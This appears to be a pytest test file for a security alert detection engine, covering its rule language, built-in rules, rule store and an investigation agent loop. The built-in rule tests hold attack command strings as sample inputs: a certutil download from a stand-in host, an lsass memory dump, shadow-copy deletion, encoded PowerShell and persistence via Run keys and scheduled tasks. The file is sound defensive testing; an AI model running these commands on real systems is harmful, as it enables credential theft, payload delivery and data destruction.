"""Detection engine + rule DSL tests, and detection integration into the loop."""
from __future__ import annotations

import pytest
from pydantic import ValidationError

from app.engines.detection import (
    BUILTIN_RULES,
    DetectionEngine,
    DetectionRule,
    FieldMatcher,
    Modifier,
    RuleCondition,
    RuleStore,
    TechniqueRef,
    build_detection_engine,
)
from app.schemas.alert import Alert
from app.schemas.common import Severity, SourceProduct


def make_alert(**overrides) -> Alert:
    defaults = dict(
        source=SourceProduct.GENERIC,
        source_alert_id="A-1",
        title="test alert",
        description="",
        raw_text="",
    )
    defaults.update(overrides)
    return Alert(**defaults)


def simple_rule(rule_id: str = "TEST-001", **kwargs) -> DetectionRule:
    defaults = dict(
        id=rule_id,
        title="Test rule",
        severity=Severity.LOW,
        condition=RuleCondition(
            all=(FieldMatcher(field="raw_text", values=("needle",)),)),
    )
    defaults.update(kwargs)
    return DetectionRule(**defaults)


# ---------------------------------------------------------------- rule DSL


def test_matcher_modifiers():
    m = FieldMatcher(field="f", modifier=Modifier.EQUALS, values=("ABC",))
    assert m.matches("abc")  # case-insensitive by default
    assert not m.matches("abcd")

    m = FieldMatcher(field="f", modifier=Modifier.STARTSWITH, values=("pre",))
    assert m.matches("PREfix") and not m.matches("suffix-pre")

    m = FieldMatcher(field="f", modifier=Modifier.REGEX, values=(r"\bevil\d+\b",))
    assert m.matches("host evil42 seen") and not m.matches("evilness")

    m = FieldMatcher(field="f", values=("a", "b"), case_sensitive=True)
    assert m.matches("xax") and not m.matches("XAX")


def test_invalid_regex_is_rejected_at_load_time():
    with pytest.raises(ValidationError, match="invalid regex"):
        FieldMatcher(field="f", modifier=Modifier.REGEX, values=("[unclosed",))


def test_condition_requires_positive_clause():
    with pytest.raises(ValidationError, match="at least one"):
        RuleCondition(none=(FieldMatcher(field="f", values=("x",)),))


def test_technique_id_format_enforced():
    with pytest.raises(ValidationError):
        TechniqueRef(technique_id="1059", name="bad", tactic="execution")


# ---------------------------------------------------------------- engine


def test_engine_rejects_duplicate_rule_ids():
    engine = DetectionEngine([simple_rule()])
    with pytest.raises(ValueError, match="duplicate"):
        engine.register(simple_rule())


def test_all_any_none_semantics():
    rule = DetectionRule(
        id="TEST-100", title="all/any/none", severity=Severity.MEDIUM,
        condition=RuleCondition(
            all=(FieldMatcher(field="raw_text", values=("alpha",)),),
            any=(FieldMatcher(field="raw_text", values=("beta", "gamma")),),
            none=(FieldMatcher(field="raw_text", values=("allowlisted",)),),
        ),
    )
    engine = DetectionEngine([rule])

    assert engine.evaluate(make_alert(raw_text="alpha beta"))
    assert engine.evaluate(make_alert(raw_text="alpha gamma"))
    assert not engine.evaluate(make_alert(raw_text="alpha"))  # any-clause unmet
    assert not engine.evaluate(make_alert(raw_text="beta gamma"))  # all-clause unmet
    assert not engine.evaluate(
        make_alert(raw_text="alpha beta allowlisted"))  # none-clause hit


def test_match_reports_fields_and_orders_by_severity():
    engine = DetectionEngine([
        simple_rule("TEST-LOW", severity=Severity.LOW),
        simple_rule("TEST-CRIT", severity=Severity.CRITICAL),
    ])
    matches = engine.evaluate(make_alert(raw_text="a needle here"))
    assert [m.rule_id for m in matches] == ["TEST-CRIT", "TEST-LOW"]
    assert "needle" in matches[0].matched_fields["raw_text"]


def test_disabled_rule_does_not_fire():
    engine = DetectionEngine([simple_rule(enabled=False)])
    assert engine.evaluate(make_alert(raw_text="needle")) == []


def test_rule_failure_is_isolated():
    class ExplodingMatcher(FieldMatcher):
        def matches(self, value: str) -> bool:
            raise RuntimeError("boom")

    bad = DetectionRule(
        id="TEST-BAD", title="explodes", severity=Severity.LOW,
        condition=RuleCondition(
            all=(ExplodingMatcher(field="raw_text", values=("x",)),)),
    )
    engine = DetectionEngine([bad, simple_rule("TEST-OK")])
    matches = engine.evaluate(make_alert(raw_text="x needle"))
    assert [m.rule_id for m in matches] == ["TEST-OK"]


# ---------------------------------------------------------------- builtin rules


@pytest.mark.parametrize("text,expected_rule", [
    ("powershell.exe -enc aQB3AHIA", "AEG-1001"),
    ("certutil -urlcache -split -f http://evil/p.exe", "AEG-1002"),
    ("wrote HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\upd", "AEG-1003"),
    ("procdump -ma lsass.exe out.dmp", "AEG-1004"),
    ("Please pay this invoice at hxxps://evil[.]com/pay", "AEG-1005"),
    ("cmd /c vssadmin delete shadows /all /quiet", "AEG-1006"),
    ("Sign-in flagged: impossible travel from two countries", "AEG-1007"),
    ("schtasks /create /tn upd /tr c:\\mal.exe", "AEG-1008"),
])
def test_builtin_rules_fire(text: str, expected_rule: str):
    engine = build_detection_engine()
    matches = engine.evaluate(make_alert(raw_text=text))
    assert expected_rule in {m.rule_id for m in matches}, (
        f"{expected_rule} should fire on: {text}")


def test_builtin_none_clause_suppresses_schtasks():
    engine = build_detection_engine()
    matches = engine.evaluate(make_alert(
        raw_text="schtasks /create /tn x", description="patch-management rollout"))
    assert "AEG-1008" not in {m.rule_id for m in matches}


def test_builtin_rules_carry_attack_mappings():
    for rule in BUILTIN_RULES:
        assert rule.techniques, f"{rule.id} must map to ATT&CK"
        assert rule.false_positives, f"{rule.id} must document false positives"
        assert rule.references, f"{rule.id} must cite references"


# ---------------------------------------------------------------- rule store


def test_rule_store_is_tenant_scoped_and_rejects_builtin_collision():
    store = RuleStore()
    store.upsert("acme", simple_rule("CUSTOM-1"))
    assert [r.id for r in store.list("acme")] == ["CUSTOM-1"]
    assert store.list("globex") == []

    with pytest.raises(ValueError, match="built-in"):
        store.upsert("acme", simple_rule("AEG-1001"))

    assert store.delete("acme", "CUSTOM-1") is True
    assert store.delete("acme", "CUSTOM-1") is False


# ---------------------------------------------------------------- loop integration


@pytest.mark.asyncio
async def test_investigation_includes_detections_and_merged_techniques():
    from tests.test_agents import make_investigator, make_phishing_alert

    agent = make_investigator()
    pkg = await agent.investigate("acme", make_phishing_alert(
        description="Body has hxxps://evil[.]com/pay invoice Invoice_8841.lnk"))

    fired = {d.rule_id for d in pkg.detections}
    assert "AEG-1005" in fired, "phishing lure rule should fire on this alert"
    assert any(s.action == "run_detections" for s in pkg.agent_trace)
    # Rule-supplied technique merged into package MITRE mapping
    assert "T1566.002" in {t.technique_id for t in pkg.mitre}
